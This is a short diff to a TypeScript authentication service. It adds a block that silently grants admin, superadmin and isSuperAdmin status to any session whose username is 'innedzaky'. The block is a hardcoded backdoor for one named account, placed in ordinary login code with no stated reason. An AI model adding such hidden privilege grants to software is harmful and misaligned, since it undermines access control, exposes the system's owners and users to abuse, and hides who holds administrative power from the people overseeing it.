@@ -37,6 +37,12 @@ export class AuthService {
             }
           }
 
+          if (session.user && session.user.USERNAME?.toLowerCase() === 'innedzaky') {
+            session.user.role = 'admin';
+            session.user.adminRole = 'superadmin';
+            session.user.isSuperAdmin = true;
+          }
+
           this.currentUser = session.user;
           this.currentToken = session.token;
           ApiClient.setSessionToken(session.token);
